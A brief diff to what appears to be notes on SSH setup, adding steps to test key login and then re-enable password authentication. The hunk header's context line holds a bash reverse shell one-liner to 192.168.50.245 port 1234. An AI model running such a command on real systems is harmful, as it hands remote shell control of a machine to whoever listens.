@@ -367,6 +367,9 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * Allow password authentication as well as key authentication
 * Disable password authentication
 * sudo systemctl restart ssh
+* Login with you ssh key
+* Once it works go back to the server and enable password authentication
+* sudo systemctl restart ssh
 
 
 
